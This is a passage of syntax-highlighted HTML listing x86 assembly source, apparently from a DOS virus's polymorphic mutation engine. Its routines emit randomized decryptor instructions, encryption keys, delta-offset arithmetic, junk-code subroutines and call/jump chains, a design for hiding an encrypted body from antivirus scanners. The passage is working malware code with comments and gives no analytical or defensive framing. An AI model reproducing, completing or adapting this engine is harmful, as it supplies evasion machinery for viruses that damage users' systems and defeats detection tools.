                </span><span class="sc1">;Get displacement into subroutine table</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Get opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fast_table</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">encrypt_here</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">address_register</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">displ_si_di</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">clave_crypt</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">decrypt_with_reg</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Decode a mov reg,byte ptr seg:[key]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">address_seg_1</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">8Ah</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_register</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc1">;Store position of encryption key</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">clave_crypt</span><span class="sc0">

                </span><span class="sc1">;Add delta offset</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_delta</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">

                </span><span class="sc1">;Decode a xor/add/sub byte ptr seg:[si/di+displ],reg</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">end_decrypt_table</span><span class="sc4">-</span><span class="sc5">decrypt_table</span><span class="sc4">)/</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand_in_range</span><span class="sc0">

                </span><span class="sc1">;Get displacement into subroutine table</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Get opcode</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_table</span><span class="sc4">+</span><span class="sc8">bx</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Write encrypt instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">encrypt_here</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">address_seg_2</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_register</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">45h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">address_register</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">displ_si_di</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Increment pointer to encrypted zone                                       ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">inst_inc_pointer</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">47h</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">address_register</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Decrement counter and loop                                                ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">inst_dec_loop</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Decode a dec reg instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">address_register</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc1">;Decode a jz </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc1">;Generate some garbage instructions</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">g_generator</span><span class="sc0">

                </span><span class="sc1">;Decode a jmp to loop instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">address_loop</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">

                </span><span class="sc1">;Generate some garbage instructions</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">g_generator</span><span class="sc0">

                </span><span class="sc1">;Store jz displacement</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Generate a push reg + garbage + pop reg                                   ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">do_push_g_pop</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Build a random push pop</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_push_pop</span><span class="sc0">

                </span><span class="sc1">;Get pop instruction</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">g_generator</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Generate a subroutine witch contains garbage code                         ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">do_subroutine</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_subroutine</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">create_routine</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">create_routine</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Generate a jump instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc1">;Save address for jump construction</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc1">;Save address of subroutine</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_subroutine</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc1">;Get subroutine address</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc1">;Generate some garbage code</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">g_generator</span><span class="sc0">

                </span><span class="sc1">;Insert ret instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc1">;Store jump displacement</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Generate a subroutine witch contains one decryptor instruction            ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">sub_decryptor</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_sub</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ok_subroutine</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ok_subroutine</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc1">;Do not generate the loop branch into a subroutine</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_pointer</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_loop_sub</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">no_loop_sub</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Generate a jump instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E9h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc1">;Save address for jump construction</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">

                </span><span class="sc1">;Save address of subroutine</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_sub</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">        
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">g_generator</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">entry_from_sub</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">g_generator</span><span class="sc0">
</span><span class="sc5">build_return</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Insert ret instruction</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0C3h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">

                </span><span class="sc1">;Store jump displacement</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Generate a call instruction to next decryptor subroutine                  ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">do_call_decryptor</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_pointer</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">no_store_call</span><span class="sc0">

                </span><span class="sc1">;Save position        </span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">address_loop</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">no_store_call</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Build a call to our subroutine</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_sub</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">

                </span><span class="sc1">;Do not use this subrotine again</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">decrypt_sub</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Generate a call instruction to a subroutine witch some garbage code       ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">do_call_garbage</span><span class="sc4">:</span><span class="sc0">
                
                </span><span class="sc1">;Check if there is a subroutine to call</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_subroutine</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">ok_call</span><span class="sc0">

                </span><span class="sc1">;No, so exit</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ok_call</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Build a call to our garbage subroutine</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0E8h</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">stosw</span><span class="sc0">

                </span><span class="sc1">;Do not use this subrotine again</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">last_subroutine</span><span class="sc4">][</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

